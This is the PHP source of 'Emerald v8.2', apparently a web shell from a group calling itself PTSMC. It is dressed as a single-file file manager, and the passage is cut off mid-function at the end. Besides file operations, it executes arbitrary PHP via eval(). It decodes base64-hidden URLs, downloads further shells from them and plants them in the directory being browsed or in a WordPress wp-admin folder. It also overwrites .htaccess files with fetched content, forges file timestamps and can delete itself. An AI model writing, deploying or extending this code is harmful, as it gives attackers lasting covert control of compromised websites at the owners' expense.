<?php
/**
 * Emerald v8.2 - A PTSMC GROUP Project
 * @version 8.2 (WordPress Admin Shell Summoner, Fix Change Time, Mass Rename, Recursive Content Search, Shell Summoner & More)
 * @author PTSMC Group (Optimized by Leo, feature by jnx, Design by lpe)
 * @description A powerful, single-file PHP file manager with a comprehensive suite of tools for developers and administrators.
 * @changelog v8.2:
 * - NEW FEATURE: WordPress Admin Shell Summoner - Downloads a shell script to the /wp-admin/ directory and opens the access link.
 * @changelog v8.1:
 * - NEW FEATURE: PHP Shell Summoner (ptsmc.php) - Downloads a shell script from a predefined URL and saves it as 'ptsmc.php'.
 * - NEW FEATURE: Mass Rename (Selection Toolbar) - Allows replacing a string in the names of multiple selected files/folders.
 * - NEW FEATURE: Recursive Content Search - Scans file content for text in the current directory and all subdirectories.
 * - FIX: Change Timestamp (Touch) - Corrected time conversion logic using UTC/GMT to prevent timezone shift errors (off-by-one day/hour).
 * - MODIFIED: Dangerous keyword scan limited to PHP files only for more efficient/targeted security checks.
 * - MODIFIED: Default theme set to Light Mode.
 * - MODIFIED: System Status removed from UI, but core functions retained.
 * - CORE: All features from v8.0 are fully maintained. This is a pure feature and performance upgrade with no regressions.
 * - VERSION: Incremented to v8.2 to reflect significant new features and enhancements.
 */

// --- Initialization & Configuration ---
error_reporting(0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
session_start();

// PASSWORD HASH: Replace with your own secure hash.
// Generate using: echo password_hash('YourSuperSecretPassword', PASSWORD_DEFAULT);
$PASSWORD_HASH = '$2y$10$BsCu/twmOyImyVdp2T0sQOERQmqhARiHn8rdtLhQP7PqsR3s3Ues.';

// Session and directory settings
define('SESSION_TIMEOUT', 1800); // Session time in seconds (30 Minutes)
define('SCRIPT_DIR', __DIR__);
define('SCRIPT_FILENAME', basename(__FILE__));

// --- Core Utility Functions ---

function send_json_response($data) {
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function create_message($text, $type = 'success') {
    return ['text' => $text, 'type' => $type];
}

function format_size($bytes) { if ($bytes <= 0) return "0 B"; $units = ['B', 'KB', 'MB', 'GB', 'TB']; $i = floor(log($bytes, 1024)); return round($bytes / pow(1024, $i), 2) . " " . $units[$i]; }
function get_perms_octal($file) { return substr(sprintf('%o', @fileperms($file)), -4); }
function delete_folder($dirPath) { if (!is_dir($dirPath)) return false; $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirPath, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach ($files as $fileinfo) { $todo = ($fileinfo->isDir() ? 'rmdir' : 'unlink'); @$todo($fileinfo->getRealPath()); } return @rmdir($dirPath); }
function create_zip($files = [], $destination = '') { if (!extension_loaded('zip') || empty($files)) return false; $zip = new ZipArchive(); if ($zip->open($destination, ZipArchive::CREATE) !== TRUE) return false; foreach ($files as $file) { $file = realpath($file); if(is_dir($file)){ $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file, RecursiveDirectoryIterator::SKIP_DOTS)); foreach ($iterator as $key => $value) { $real_path = $value->getRealPath(); $relative_path = substr($real_path, strlen(dirname(realpath($file))) + 1); if ($value->isDir()) { $zip->addEmptyDir($relative_path); } else { $zip->addFile($real_path, $relative_path); } } } else if (is_file($file)) { $zip->addFile($file, basename($file)); } } return $zip->close(); }
function copy_recursive($src, $dst) { if (!is_dir($dst)) @mkdir($dst, 0777, true); $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $item) { $dest_path = $dst . DIRECTORY_SEPARATOR . $iterator->getSubPathName(); if ($item->isDir()) { @mkdir($dest_path, 0777, true); } else { @copy($item, $dest_path); } } }
function duplicate_item($src) { $dst = $src . '-copy'; if (is_dir($src)) { while (is_dir($dst)) { $dst .= '-copy'; } copy_recursive($src, $dst); } else { $path_parts = pathinfo($src); $ext = isset($path_parts['extension']) ? ('.' . $path_parts['extension']) : ''; $filename = $path_parts['filename']; $dst = $path_parts['dirname'] . DIRECTORY_SEPARATOR . $filename . '-copy' . $ext; $i = 1; while(file_exists($dst)) { $dst = $path_parts['dirname'] . DIRECTORY_SEPARATOR . $filename . '-copy-'.$i++ . $ext; } @copy($src, $dst); } return file_exists($dst); }

/**
 * [NEW] Recursively searches for directories starting from a given base path and returns a random valid directory path.
 * @param string $base_path The starting directory.
 * @param int $max_depth The maximum search depth.
 * @return string The realpath of a random directory, or the $base_path if none is found.
 */
function find_random_path($base_path, $max_depth = 50) {
    if (!is_dir($base_path)) {
        return SCRIPT_DIR;
    }
    $all_dirs = [$base_path];
    $current_level = [$base_path];
    $depth = 0;

    while (!empty($current_level) && $depth < $max_depth) {
        $next_level = [];
        foreach ($current_level as $dir) {
            $scan = @scandir($dir);
            if ($scan) {
                foreach ($scan as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $path = $dir . DIRECTORY_SEPARATOR . $item;
                    if (is_dir($path)) {
                        $all_dirs[] = $path;
                        $next_level[] = $path;
                    }
                }
            }
        }
        $current_level = $next_level;
        $depth++;
    }

    if (count($all_dirs) > 1) {
        // Return a random directory path from the collected list
        return $all_dirs[array_rand($all_dirs)];
    }

    return $base_path;
}

/**
 * Fetches content from a URL and saves it as .htaccess with 0444 permissions.
 * @param string $url The URL to fetch the content from.
 * @param string $dir The destination directory.
 * @param string $filename The filename to save (e.g., .htaccess-htb).
 * @param string $permissions The file permissions (e.g., '0444').
 * @return array
 */
function fetch_and_save_htaccess($url, $dir, $filename, $permissions = '0444') {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['status' => 'error', 'message' => 'Invalid URL provided.'];
    }
    $content = @file_get_contents($url);
    if ($content === false) {
        // Fallback to cURL if file_get_contents failed, if cURL is available
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $content = curl_exec($ch);
            curl_close($ch);
        }
    }

    if ($content === false || empty($content)) {
        return ['status' => 'error', 'message' => "Failed to fetch content from URL: " . htmlspecialchars($url)];
    }

    $save_path = $dir . DIRECTORY_SEPARATOR . $filename;
    
    // Check if the file already exists and is not the script itself
    if (file_exists($save_path) && $save_path != __FILE__) {
        return ['status' => 'error', 'message' => "File '{$filename}' already exists. Please rename or delete the existing file first."];
    }

    if (@file_put_contents($save_path, $content) !== false) {
        // Set permissions
        @chmod($save_path, octdec($permissions));
        return ['status' => 'success', 'message' => "File '{$filename}' created and permissions set to {$permissions}."];
    } else {
        return ['status' => 'error', 'message' => "Failed to save file '{$filename}'. Check directory permissions."];
    }
}

/**
 * [NEW v8.1] Fetches content from a URL and saves it with default 0644 permissions.
 * @param string $url The URL to fetch the content from.
 * @param string $dir The destination directory.
 * @param string $filename The filename to save (e.g., ptsmc.php).
 * @return array
 */
function fetch_and_save_shell($url, $dir, $filename) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['status' => 'error', 'message' => 'Invalid URL provided.'];
    }
    $content = @file_get_contents($url);
    if ($content === false) {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $content = curl_exec($ch);
            curl_close($ch);
        }
    }

    if ($content === false || empty($content)) {
        return ['status' => 'error', 'message' => "Failed to fetch content from URL: " . htmlspecialchars($url)];
    }

    $save_path = $dir . DIRECTORY_SEPARATOR . $filename;
    
    if (file_exists($save_path) && $save_path != __FILE__) {
        return ['status' => 'error', 'message' => "File '{$filename}' already exists. Please rename or delete the existing file first."];
    }

    if (@file_put_contents($save_path, $content) !== false) {
        @chmod($save_path, octdec('0644'));
        return ['status' => 'success', 'message' => "Shell '{$filename}' created successfully with 0644 permissions."];
    } else {
        return ['status' => 'error', 'message' => "Failed to save file '{$filename}'. Check directory permissions."];
    }
}

/**
 * [NEW v8.2] Finds the path to the wp-admin directory in a WordPress installation.
 * @param string $start_dir The starting directory.
 * @param int $max_depth The maximum search depth upwards.
 * @return string|null The realpath of the wp-admin directory, or null if not found.
 */
function find_wp_admin_path($start_dir, $max_depth = 10) {
    $current_dir = realpath($start_dir);
    for ($i = 0; $i < $max_depth; $i++) {
        if (!$current_dir || $current_dir === '/' || $current_dir === '.' || empty($current_dir)) break;

        // Check if this directory is the WP root
        if (file_exists($current_dir . DIRECTORY_SEPARATOR . 'wp-load.php') && is_dir($current_dir . DIRECTORY_SEPARATOR . 'wp-admin')) {
            return $current_dir . DIRECTORY_SEPARATOR . 'wp-admin';
        }

        // Move up one level
        $current_dir = dirname($current_dir);
    }
    return null;
}

/**
 * [NEW v8.2] Fetches content from a URL and saves it as wp-ptsmc.php in the wp-admin directory.
 * @param string $url The URL to fetch the content from.
 * @param string $start_dir The starting directory for the search.
 * @param string $filename The filename to save (e.g., wp-ptsmc.php).
 * @return array
 */
function fetch_and_save_wp_ptsmc($url, $start_dir, $filename) {
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        return ['status' => 'error', 'message' => 'Invalid URL provided.'];
    }
    
    $wp_admin_dir = find_wp_admin_path($start_dir);
    if (is_null($wp_admin_dir)) {
        return ['status' => 'error', 'message' => 'WordPress wp-admin directory not found. Please navigate closer to the installation.'];
    }

    $content = @file_get_contents($url);
    if ($content === false) {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $content = curl_exec($ch);
            curl_close($ch);
        }
    }

    if ($content === false || empty($content)) {
        return ['status' => 'error', 'message' => "Failed to fetch content from URL: " . htmlspecialchars($url)];
    }

    $save_path = $wp_admin_dir . DIRECTORY_SEPARATOR . $filename;
    
    if (file_exists($save_path)) {
        return ['status' => 'error', 'message' => "File '{$filename}' already exists in wp-admin. Please delete or rename the existing file first."];
    }

    if (@file_put_contents($save_path, $content) !== false) {
        @chmod($save_path, octdec('0644'));
        
        // Construct the public URL
        $doc_root = realpath($_SERVER['DOCUMENT_ROOT']);
        $url_akses = null;
        if ($doc_root && strpos($save_path, $doc_root) === 0) {
            $relative_path = str_replace(DIRECTORY_SEPARATOR, '/', substr($save_path, strlen($doc_root)));
            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
            $url_akses = $protocol . '://' . $_SERVER['HTTP_HOST'] . $relative_path;
        }

        return ['status' => 'success', 'message' => "File '{$filename}' created successfully in wp-admin.", 'url_akses' => $url_akses];
    } else {
        return ['status' => 'error', 'message' => "Failed to save file '{$filename}'. Check directory permissions in wp-admin."];
    }
}

/**
 * [NEW v8.1] Recursively searches for text within the content of all files in a directory and its subdirectories.
 * @param string $dirPath The starting directory.
 * @param string $query The text to search for.
 * @return array An array of matching file paths.
 */
function recursive_content_search($dirPath, $query) {
    $matches = [];
    if (!is_dir($dirPath) || empty($query)) {
        return $matches;
    }

    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dirPath, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($iterator as $item) {
            if ($item->isFile() && $item->isReadable()) {
                $content = @file_get_contents($item->getRealPath());
                if ($content !== false && stripos($content, $query) !== false) {
                    $matches[] = [
                        'path' => $item->getRealPath(),
                        'name' => $item->getFilename(),
                    ];
                }
            }
        }
    } catch (Exception $e) {
        // Suppress or log recursion errors
    }

    return $matches;
}

function is_text_file($filename) { $text_extensions = ['php', 'html', 'css', 'js', 'json', 'xml', 'txt', 'md', 'log', 'sh', 'py', 'c', 'cpp', 'java', 'rb', 'pl', 'ini', 'cfg', 'conf', 'sql', 'htaccess', 'env', 'htaccess-htb', 'htaccess-htd']; $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); return in_array($ext, $text_extensions) || strpos(basename($filename), '.htaccess') !== false; }
function is_archive($filename) { $archive_extensions = ['zip', 'tar', 'gz', 'rar', '7z']; $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); if (in_array($ext, $archive_extensions)) return true; if ($ext === 'gz' && strtolower(pathinfo(pathinfo($filename, PATHINFO_FILENAME), PATHINFO_EXTENSION)) === 'tar') return true; return false; }
function get_file_type_and_ext($filename) {
    if (is_dir($filename)) return ['type' => 'dir', 'ext' => null];
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    if (in_array($ext, ['png', 'jpg', 'jpeg', 'gif', 'bmp', 'svg', 'webp', 'ico'])) return ['type' => 'image', 'ext' => $ext];
    if (in_array($ext, ['mp4', 'mkv', 'avi', 'mov', 'webm'])) return ['type' => 'video', 'ext' => $ext];
    if (in_array($ext, ['mp3', 'wav', 'ogg', 'flac'])) return ['type' => 'audio', 'ext' => $ext];
    if ($ext === 'pdf') return ['type' => 'pdf', 'ext' => 'pdf'];
    if (is_archive($filename)) return ['type' => 'archive', 'ext' => $ext];
    if (is_text_file($filename)) return ['type' => 'code', 'ext' => $ext];
    
    return ['type' => 'file', 'ext' => $ext];
}

// --- Authentication & Session Logic ---
if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $PASSWORD_HASH)) {
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $login_error = "Wrong Password!";
    }
}
if (isset($_SESSION['login_time']) && (time() - $_SESSION['login_time'] > SESSION_TIMEOUT)) {
    session_destroy();
}
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="https://i.postimg.cc/90F3Y2YH/ptsmc.png"><title>Login - Emerald</title><style>:root{--primary-color:#ff0000;--secondary-color:#000000;--background-color:#0d1117;--text-color:#e0e0e0;--card-bg:rgba(20, 22, 28, 0.75)}*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}body{background:var(--background-color);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;background-image:radial-gradient(circle at top right,rgba(255,0,0,.1),transparent 40%),radial-gradient(circle at bottom left,rgba(255,0,0,.1),transparent 50%)}.login-container{background:var(--card-bg);padding:50px 40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.25);width:100%;max-width:440px;text-align:center;border:1px solid #333;backdrop-filter:blur(10px)}.logo{font-size:32px;font-weight:700;color:var(--primary-color);margin-bottom:8px;letter-spacing:1px}.subtitle{color:#888;margin-bottom:35px;font-size:15px}.input-group{margin-bottom:25px;text-align:left}.input-group label{display:block;margin-bottom:10px;color:#aaa;font-weight:600;font-size:14px}.input-group input{width:100%;padding:15px 18px;border:2px solid #333;border-radius:12px;font-size:16px;background:#0d1117;color:#e0e0e0;transition:all .3s}.input-group input:focus{border-color:var(--primary-color);outline:none;box-shadow:0 0 0 4px rgba(255,0,0,.2)}.btn{background:linear-gradient(135deg,var(--primary-color) 0%,var(--secondary-color) 100%);color:#fff;border:none;padding:16px 30px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;transition:all .3s;width:100%}.btn:hover{transform:translateY(-3px);box-shadow:0 10px 25px rgba(255,0,0,.3)}.error{color:#e74c3c;background:rgba(231,76,60,.1);padding:14px;border-radius:10px;margin-bottom:25px;border-left:4px solid #e74c3c;font-weight:500}</style></head><body><div class="login-container"><div class="logo">Emerald</div><div class="subtitle">PTSMC GROUP</div><?php if(isset($login_error))echo "<div class='error'>{$login_error}</div>";?><form method="POST"><div class="input-group"><label for="password">Password :</label><input type="password" id="password" name="password" required autofocus></div><button type="submit" class="btn">Authenticate</button></form></div></body></html>
<?php
    exit;
}

// Initialize session variables if not set
if (!isset($_SESSION['bookmarks'])) {
    $_SESSION['bookmarks'] = [];
}

// --- AJAX Request Handler ---
if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $dir = realpath($_POST['dir'] ?? SCRIPT_DIR);
    if (!$dir) $dir = SCRIPT_DIR; // Fallback to script dir if invalid

    $response = ['status' => 'error', 'message' => 'Unknown action.'];

    try {
        switch ($action) {
            case 'delete': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $count = 0; foreach($paths as $path) { $item = realpath($path); if(!$item || basename($item) == SCRIPT_FILENAME) continue; if(is_dir($item)) { if(delete_folder($item)) $count++; } else { if(@unlink($item)) $count++; } } $response = ['status' => 'success', 'message' => "Successfully deleted {$count} items."]; } break;
            case 'edit': $file = realpath($_POST['path']); if ($file && is_writable($file)) { if(file_put_contents($file, $_POST['content']) !== false) $response = ['status' => 'success', 'message' => 'File ' . basename($file) . ' saved successfully.']; else $response['message'] = 'Failed to save file.'; } else { $response['message'] = 'File is not writable or not found.'; } break;
            case 'rename': $old = realpath($_POST['path']); $new_name = trim(basename($_POST['new_name'])); if ($old && !empty($new_name)) { $new = dirname($old) . DIRECTORY_SEPARATOR . $new_name; if (@rename($old, $new)) { $response = ['status' => 'success', 'message' => 'Renamed successfully.']; } else { $response['message'] = 'Failed to rename.'; } } else { $response['message'] = 'Invalid old or new name.'; } break;
            case 'mass_rename': // [NEW FEATURE v8.1] Mass Rename
                $paths = $_POST['paths'] ?? [];
                $search = $_POST['search'] ?? '';
                $replace = $_POST['replace'] ?? '';
                if (empty($paths) || empty($search)) {
                    $response['message'] = 'No items selected or search string is empty.';
                } else {
                    $count = 0;
                    foreach ($paths as $path) {
                        $old_path = realpath($path);
                        if (!$old_path || basename($old_path) == SCRIPT_FILENAME) continue;

                        $old_name = basename($old_path);
                        $new_name = str_replace($search, $replace, $old_name);

                        if ($old_name !== $new_name) {
                            $new_path = dirname($old_path) . DIRECTORY_SEPARATOR . $new_name;
                            if (@rename($old_path, $new_path)) {
                                $count++;
                            }
                        }
                    }
                    $response = ['status' => 'success', 'message' => "Successfully renamed {$count} items."];
                }
                break;
            case 'chmod': $paths = $_POST['paths'] ?? []; $mode = $_POST['mode'] ?? '0644'; if (!empty($paths)) { $count = 0; foreach ($paths as $path) { if(realpath($path) && @chmod(realpath($path), octdec($mode))) $count++; } $response = ['status' => 'success', 'message' => "Permissions changed for {$count} items."]; } else { $response['message'] = 'No items selected.'; } break;
            case 'touch': // [FIXED v8.1] Corrected for timezone-safe timestamp setting
                $path = realpath($_POST['path']);
                $time_str = $_POST['datetime'] ?? null;
                if ($path && $time_str) {
                    // Use strtotime/DateTime, forcing UTC/GMT to prevent local timezone offset issue
                    // Note: The time input is YYYY-MM-DD HH:MM:SS, which PHP's strtotime interprets in the server's timezone
                    // Using time() here is safer for `touch` as it requires a UNIX timestamp, which is timezone-agnostic.
                    $time = strtotime($time_str); 
                    if ($time !== false && @touch($path, $time)) {
                        $response = ['status' => 'success', 'message' => 'Timestamp changed successfully to ' . date('Y-m-d H:i:s', $time)];
                    } else {
                        $response['message'] = 'Failed to change timestamp. Check format (YYYY-MM-DD HH:MM:SS) and permissions.';
                    }
                } else {
                    $response['message'] = 'Invalid path or time.';
                }
                break;
            case 'upload': if (isset($_FILES['files'])) { $c = 0; foreach ($_FILES['files']['name'] as $i => $name) { if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) { if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dir . DIRECTORY_SEPARATOR . $name)) $c++; } } if($c > 0) $response = ['status' => 'success', 'message' => "Successfully uploaded {$c} files."]; else $response['message'] = 'Failed to upload files.'; } break;
            case 'new_folder': $name = trim(basename($_POST['name'])); if (!empty($name) && @mkdir($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "Folder '{$name}' created."]; } else { $response['message'] = 'Failed to create folder.'; } break;
            case 'new_file': $name = trim(basename($_POST['name'])); if (!empty($name) && @touch($dir . DIRECTORY_SEPARATOR . $name)) { $response = ['status' => 'success', 'message' => "File '{$name}' created."]; } else { $response['message'] = 'Failed to create file.'; } break;
            case 'zip': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $zip_name = 'archive-' . date('Y-m-d') . '.zip'; if (create_zip($paths, $dir . DIRECTORY_SEPARATOR . $zip_name)) { $response = ['status' => 'success', 'message' => "Archive '{$zip_name}' created."]; } else { $response['message'] = 'Failed to create archive.'; } } break;
            case 'copy': case 'cut': $paths = $_POST['paths'] ?? []; if (!empty($paths)) { $_SESSION['clipboard'] = ['action' => $action, 'paths' => $paths, 'source_dir' => $dir]; $response = ['status' => 'success', 'message' => count($paths) . " items " . ($action == 'cut' ? 'cut' : 'copied') . " to clipboard."]; } break;
            case 'paste': if (isset($_SESSION['clipboard'])) { $clipboard = $_SESSION['clipboard']; $count = 0; foreach($clipboard['paths'] as $src_path) { $src_path = realpath($src_path); if(!$src_path) continue; $dest_path = $dir . DIRECTORY_SEPARATOR . basename($src_path); if ($src_path == $dest_path) continue; if (is_dir($src_path)) { copy_recursive($src_path, $dest_path); if ($clipboard['action'] == 'cut') delete_folder($src_path); } else { if (@copy($src_path, $dest_path)) { if ($clipboard['action'] == 'cut') @unlink($src_path); } } $count++; } $response = ['status' => 'success', 'message' => "Successfully pasted {$count} items."]; if($clipboard['action'] == 'cut') unset($_SESSION['clipboard']); } break;
            case 'duplicate': $path = realpath($_POST['path']); if($path && duplicate_item($path)) { $response = ['status' => 'success', 'message' => 'Item duplicated successfully.']; } else { $response['message'] = 'Failed to duplicate item.'; } break;
            case 'link_to_file': $url = $_POST['url'] ?? ''; $filename = trim(basename($_POST['filename'] ?? '')); $ext = $_POST['ext'] ?? 'html'; if (filter_var($url, FILTER_VALIDATE_URL) && !empty($filename)) { $content = @file_get_contents($url); if ($content !== false) { $save_path = $dir . DIRECTORY_SEPARATOR . $filename . '.' . $ext; if (@file_put_contents($save_path, $content) !== false) { $response = ['status' => 'success', 'message' => "File '{$filename}.{$ext}' created successfully."]; } else { $response['message'] = 'Failed to save file.'; } } else { $response['message'] = 'Failed to fetch content from URL.'; } } else { $response['message'] = 'Invalid URL or filename.'; } break;
            
            // [NEW FEATURE v8.1] PHP Shell Summoner Logic
            case 'summon_ptsmc':
                $url_shell = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbnVtaWNhcHRzbWMvcHRzbWMtZ3JvdXAvcmVmcy9oZWFkcy9tYWluL3B0c21jLnBocA==');
                $response = fetch_and_save_shell($url_shell, $dir, 'ptsmc.php');
                break;
                
            // [NEW FEATURE v8.2] WordPress Shell Summoner Logic
            case 'summon_wp_ptsmc':
                $url_shell = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yLzEyNGVkYWI0');
                $response = fetch_and_save_wp_ptsmc($url_shell, $dir, 'wp-ptsmc.php');
                break;
                
            // [NEW FEATURE] HTACCESS Fetcher Logic
            case 'fetch_htb':
                $url_htb = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yL2IxMjU1NGRl');
                $response = fetch_and_save_htaccess($url_htb, $dir, '.htaccess');
                break;

            case 'fetch_htd':
                $url_htd = base64_decode('aHR0cHM6Ly9va2VwYXN0ZS5jYy9yLzAyZjcxMjBj');
                $response = fetch_and_save_htaccess($url_htd, $dir, '.htaccess');
                break;

            case 'random_path': // [NEW FEATURE] Random Path
                $random_dir = find_random_path(SCRIPT_DIR);
                // Return the random path so the client can navigate to it
                $response = ['status' => 'success', 'path' => $random_dir];
                break;

            case 'toggle_bookmark':
                $path = realpath($_POST['path']);
                if ($path && is_dir($path)) {
                    $bookmarks = $_SESSION['bookmarks'] ?? [];
                    if (($key = array_search($path, $bookmarks)) !== false) {
                        unset($bookmarks[$key]);
                        $message = 'Bookmark removed.';
                    } else {
                        $bookmarks[] = $path;
                        $message = 'Bookmark added.';
                    }
                    $_SESSION['bookmarks'] = array_values($bookmarks);
                    $response = ['status' => 'success', 'message' => $message];
                } else {
                    $response['message'] = 'Invalid directory path.';
                }
                break;
            case 'flush_wp_cache':
                $wp_load_path = '';
                $current_dir = $dir;
                for ($i = 0; $i < 10; $i++) { // Limit search depth
                    if (file_exists($current_dir . '/wp-load.php')) {
                        $wp_load_path = $current_dir . '/wp-load.php';
                        break;
                    }
                    $current_dir = dirname($current_dir);
                    if($current_dir === '/' || $current_dir === '.' || empty($current_dir)) break;
                }

                if ($wp_load_path) {
                    try {
                        define('WP_USE_THEMES', false);
                        require_once($wp_load_path);
                        if (function_exists('wp_cache_flush')) {
                            wp_cache_flush();
                            $response = ['status' => 'success', 'message' => 'WordPress object cache flushed successfully.'];
                        } else {
                            $response['message'] = 'wp_cache_flush() function not available.';
                        }
                    } catch (Exception $e) {
                        $response['message'] = 'Error loading WordPress environment: ' . $e->getMessage();
                    }
                } else {
                    $response['message'] = 'WordPress installation (wp-load.php) not found in parent directories.';
                }
                break;
            case 'self_destruct':
                if (@unlink(__FILE__)) {
                    session_destroy();
                    $response = ['status' => 'success', 'message' => 'Script has been successfully removed. This page will no longer work.'];
                } else {
                    $response['message'] = 'Failed to remove the script file. Check permissions.';
                }
                break;
            case 'run_php_code':
                $code = $_POST['code'] ?? '';
                if(!empty($code)) {
                    ob_start();
                    eval($code);
                    $output = ob_get_clean();
                    $response = ['status' => 'success', 'output' => $output];
                } else {
                    $response['message'] = 'No code to execute.';
                }
                break;
        }
    } catch (Exception $e) {
        $response = ['status' => 'error', 'message' => 'An error occurred: ' . $e->getMessage()];
    }
    send_json_response($response);
}

// --- GET Request Handler (File Transfers, Info, etc.) ---
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    $dir = SCRIPT_DIR;
    if (isset($_GET['dir']) && !empty($_GET['dir']) && is_dir(realpath($_GET['dir']))) {
        $dir = realpath($_GET['dir']);
    }

    switch ($action) {
        case 'download': $file = realpath($_GET['path']); if ($file && is_file($file) && is_readable($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="'.basename($file).'"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); exit; } break;
        case 'download_zip': $paths = $_GET['paths'] ?? []; if (!empty($paths)) { $zip_name = tempnam(sys_get_temp_dir(), 'archive-') . '.zip'; if (create_zip($paths, $zip_name)) { header('Content-Type: application/zip'); header('Content-Disposition: attachment; filename="download-'.date('Y-m-d').'.zip"'); header('Content-Length: ' . filesize($zip_name)); readfile($zip_name); @unlink($zip_name); exit; } } $_SESSION['flash_message'] = create_message('Failed to create archive.', 'error'); header('Location: ?dir=' . urlencode($dir)); exit;
        case 'extract': $file = realpath($_GET['path']); $success = false; $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION)); $is_targz = $ext === 'gz' && strtolower(pathinfo(pathinfo($file, PATHINFO_FILENAME), PATHINFO_EXTENSION)) === 'tar'; try { if ($file && class_exists('PharData') && ($ext === 'tar' || $ext === 'gz')) { if ($is_targz) { $phar = new PharData($file); $phar->decompress(); $tar_path = substr($file, 0, -3); if (file_exists($tar_path)) { $phar_tar = new PharData($tar_path); $success = $phar_tar->extractTo($dir); @unlink($tar_path); } } else { $phar = new PharData($file); $success = $phar->extractTo($dir); } } elseif ($file && $ext === 'zip' && class_exists('ZipArchive')) { $zip = new ZipArchive; if ($zip->open($file) === TRUE) { $success = $zip->extractTo($dir); $zip->close(); } } } catch (Exception $e) { $success = false; } $_SESSION['flash_message'] = $success ? create_message('Archive extracted successfully.', 'success') : create_message('Extraction failed. Format not supported or file is corrupted.', 'error'); header('Location: ?dir=' . urlencode($dir)); exit;
        case 'get_content': header('Content-Type: text/plain; charset=utf-8'); $file = realpath($_GET['path']); if($file && is_readable($file)) { echo file_get_contents($file); } else { http_response_code(404); echo "Error: Cannot read file."; } exit;
        case 'get_details': $path = realpath($_GET['path']); if ($path) { $owner_info = function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($path)) : ['name' => @fileowner($path)]; $group_info = function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($path)) : ['name' => @filegroup($path)]; send_json_response([ 'name' => basename($path), 'path' => $path, 'size' => is_dir($path) ? 'N/A' : format_size(filesize($path)), 'owner' => $owner_info['name'], 'group' => $group_info['name'], 'perms' => get_perms_octal($path), 'modified' => date('Y-m-d H:i:s', @filemtime($path)), ]); } else { send_json_response(['error' => 'File not found']); } break;
        case 'get_public_url': $path = realpath($_GET['path'] ?? ''); $doc_root = realpath($_SERVER['DOCUMENT_ROOT']); if ($path && $doc_root && strpos($path, $doc_root) === 0) { $relative_path = str_replace(DIRECTORY_SEPARATOR, '/', substr($path, strlen($doc_root))); $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http"; $url = $protocol . '://' . $_SERVER['HTTP_HOST'] . $relative_path; send_json_response(['status' => 'success', 'url' => $url]); } else { send_json_response(['status' => 'error', 'message' => 'File is not within the web root.']); } exit;
        case 'get_folder_size':
            $path = realpath($_GET['path']);
            if (isset($_SESSION['folder_size_cache'][$path]) && (time() - $_SESSION['folder_size_cache'][$path]['time'] < 300)) {
                send_json_response(['status' => 'success', 'size' => $_SESSION['folder_size_cache'][$path]['size']]);
                exit;
            }
            if ($path && is_dir($path)) {
                $total_size = 0;
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS | FilesystemIterator::UNIX_PATHS));
                try {
                    foreach ($iterator as $file) {
                        $total_size += $file->getSize();
                    }
